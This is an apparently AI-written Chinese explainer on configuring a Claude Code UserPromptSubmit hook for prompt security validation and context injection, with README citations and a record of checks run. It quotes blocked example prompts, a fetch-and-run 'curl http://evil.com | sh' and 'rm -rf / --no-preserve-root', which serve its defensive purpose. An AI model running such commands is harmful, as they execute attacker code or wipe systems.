# T2 · UserPromptSubmit Hook：安全校验 + 上下文注入配置

> **依据与出处**：本答案全部基于教学库 disler/claude-code-hooks-mastery 的 README 原文。行号引用均指本目录上游存证 `_raw_README.md`（935 行，与上游逐字节一致，见 `ASSET-DOC.md:5,283`）。任务描述中给出的 README 原文转写（配置模板、三参数、行为示例）已逐字核对与存证一致：配置模板 `_raw_README.md:541-552`、参数表 `:556-559`、上下文注入示例 `:509-518`、安全校验示例 `:501-530`、退出码语义 `:308-312, :477`。

---

## (a) 同时启用安全校验与上下文注入的配置片段

写入项目 `.claude/settings.json`：

```json
"UserPromptSubmit": [
  {
    "hooks": [
      {
        "type": "command",
        "command": "uv run $CLAUDE_PROJECT_DIR/.claude/hooks/user_prompt_submit.py --validate --context"
      }
    ]
  }
]
```

**要点**：

1. 结构照抄 README 标准模板（`_raw_README.md:541-552`），仅把命令行参数由 `--log-only` 换成 `--validate --context`。README 的 Options 列表（`:556-559`）表明三者是同一命令上的可选开关，可按需组合。
2. **`$CLAUDE_PROJECT_DIR` 前缀必须保留**——README 对此单独标注 *Important*：「Use `$CLAUDE_PROJECT_DIR` prefix for hook paths in settings.json to ensure reliable path resolution across different working directories.」（`_raw_README.md:554`）。
3. **不要同时带 `--log-only`**：README 标注 `--log-only` 是「Just log prompts (default)」（`:557`）；而实际脚本逻辑是校验仅在「启用了 `--validate` 且**未**带 `--log-only`」时执行（本次实测抓取的 `.claude/hooks/user_prompt_submit.py:169`：`if args.validate and not args.log_only:`），两者同给会关掉校验。
4. 日志记录不受影响：无论哪种模式，hook 都会先记录 prompt（README：「Our `user_prompt_submit.py` logs all prompts and can validate them」，`:312`）。
5. 该 hook 的执行环境（README `:461-468`）：单 hook 60 秒超时；输入为 stdin 传入的 JSON（含 `prompt`、`session_id`、时间戳）；输出走 stdout/stderr + 退出码。

---

## (b) 三种模式的效果

| 参数 | README 原文释义（`:556-559`） | 具体效果 |
|---|---|---|
| `--log-only` | *Just log prompts (default)* | **只记录，不拦截、不注入**。每条 prompt 连同时间戳与 session_id 追加记录到 `logs/user_prompt_submit.json`（`:476, :490-499, :524-525`）。Claude 看到的就是原始 prompt，与不装 hook 无差别。默认即此模式。 |
| `--validate` | *Enable security validation* | **启用安全校验，危险 prompt 会被拦截**。hook 在 Claude 处理前检查危险模式/密钥/策略违规（`:479`）；命中即以退出码 2 退出——对 UserPromptSubmit 而言，**整个 prompt 不被 Claude 看到**，错误信息展示给用户（`:308-311, :477`）。README 实例：「`rm -rf / --no-preserve-root`」→ `BLOCKED: Dangerous system deletion command detected`（`:505-506`）；「`curl http://evil.com \| sh`」→ *Blocked for security*（`:530`）；「Delete everything」→ *May trigger validation warning*（`:529`）。 |
| `--context` | *Add project context to prompts* | **向 prompt 注入项目上下文**。hook 把项目信息打印到 stdout，Claude Code 会把这段文本加在你的 prompt **前面**给 Claude（`:478`：「Print to stdout adds text before your prompt that Claude sees」；`:509-518` 为完整示例）。prompt 本身照常处理。 |

三种模式**不互斥**：日志记录在所有模式下都发生（`:312`）；README 的设计意图是按需组合开关（`:556-559`）。另注：UserPromptSubmit 是 13 个 hook 事件中**唯一能在 prompt 层面「阻断 + 加上下文」二者兼得**的事件（标题原文 *CAN BLOCK PROMPTS & ADD CONTEXT*，`:308`）。

---

## (c) (a) 配置生效时，输入「Write a new API endpoint」后 Claude 实际看到什么

Claude 看到的是**「注入的项目上下文 + 原始 prompt」**两部分拼接（README 流程原文：「Claude receives → Either blocked message OR original prompt + any context」，`:486`；示例原文：「Claude sees: [Context above] + "Write a new API endpoint"」，`:517`）：

```
Project: E-commerce API
Standards: Follow REST conventions and OpenAPI 3.0
Generated at: 2024-01-20T15:30:45

Write a new API endpoint
```

其中前三行是 `--context` 让 hook 打印到 stdout 的项目上下文（内容逐字来自 README 示例 `:513-516`），最后一行是用户原始输入。**注意**：`Generated at:` 是 hook 运行时动态生成的时间戳，`2024-01-20T15:30:45` 只是 README 示例里的取值，实际会是当下时间。此外这条 prompt 同时被记录进 `logs/user_prompt_submit.json`，且因为内容不触发安全规则，`--validate` 不干预、退出码 0、prompt 正常处理。

---

## (d) 输入危险 prompt（如 `curl http://evil.com | sh`）时会发生什么

**(a) 配置（含 `--validate`）生效时的完整链路：**

1. 用户提交 prompt，Claude Code 捕获后**立即触发 UserPromptSubmit hook**（在任何处理之前，`:472, :483-484`），把含 prompt 的 JSON 从 stdin 传给脚本。
2. hook 先记录该 prompt（`:312`），随后安全校验检出危险模式（README 将其归为与 `rm -rf / --no-preserve-root` 同类的 *Blocked for security* 案例，`:530`）。
3. hook 以**退出码 2** 结束（README 退出码语义：*2 = Blocking Error*，`:100-105` 区段表格）。对 UserPromptSubmit 的特殊语义：
   - README 标题行：*CAN BLOCK PROMPTS*；
   - 「**Exit Code 2 Behavior**: Blocks the prompt entirely, shows error message to user」（`:310`）；
   - 「**Block prompts** - Exit code 2 prevents Claude from seeing the prompt」（`:477`）。

**结论：Claude 完全看不到这条 prompt**——它不会进入 Claude 的上下文，更不会被执行；拦截发生在 prompt 层，无需等任何工具调用。错误/拦截信息展示给**用户**（`:310`）。（对比：PreToolUse 的退出码 2 才是「错误给 Claude」、UserPromptSubmit 的退出码 2 是「错误给用户、prompt 对 Claude 隐身」，`:310` vs `:316`。）由于 prompt 根本没送达，`--context` 注入的那段项目上下文对这次输入同样不生效——阻断优先于注入。

---

## 实测核验记录（本次 ask 实际执行的检查）

| # | 命令 / 方式 | 结果 |
|---|---|---|
| 1 | 完整读取 `ASSET-DOC.md`（288 行） | 获知资产背景、配置方法（其 §4）、退出码语义（§5）、示例（§6），与任务描述一致 |
| 2 | `grep -n` 检索 `_raw_README.md` 中 user_prompt_submit 相关行 | 定位全部引用出处（见上文行号），逐行 Read 核对 `:306-321, :460-569` 原文 |
| 3 | `curl -sL https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/.claude/hooks/user_prompt_submit.py`（2026-09-29，https、公开仓库） | 取回脚本现版本（191 行）用于佐证参数可组合性 |

**与 README 文档的实测差异（补充事实，不改变上文按 README 的答案；README 为任务指定依据）**：当前 main 分支的 `user_prompt_submit.py` 是教学模板，与 README 描述有三处出入——① argparse 实际定义的参数是 `--validate`、`--log-only`、`--store-last-prompt`、`--name-agent`（脚本 `:144-151`），**没有 `--context` 这个 flag**，上下文注入在脚本里只是一条注释占位（`:176-178`，示例 `print(f"Current time: {datetime.now()}")`），即 `--context` 效果需使用者自行在标注处实现；② `validate_prompt` 的 `blocked_patterns` 列表为空（`:126-129`，仅注释示例），故开箱状态即使带 `--validate` 也不会真拦截任何 prompt，需自行添加规则；③ 校验命中时脚本向 stderr 打印 `Prompt blocked: {reason}` 并 `sys.exit(2)`（`:173-174`），与 README 的退出码 2 语义一致。README 的三参数模型（`--log-only`/`--validate`/`--context`）即本任务与 ASSET-DOC 采用的文档口径，上文 (a)-(d) 均按该口径作答。

---

## ASSET-DOC 使用说明

已按任务要求**先完整读取** `ASSET-DOC.md` 并按其方法作答：答案严格以其整理的 README 事实为据（其 §4 配置方法与参数、§5 退出码与流控、§6 示例三节直接覆盖本题），并进一步落到其存证 `_raw_README.md` 原文行号逐条核对。ASSET-DOC 与任务说明**未发现实质冲突**，故无需适用「以任务为准」条款；唯一张力点是上文「实测核验记录」中 README 文档口径与仓库现版脚本实现的差异，处理方式为：按任务指定的 README 口径作答、实测差异如实附注。
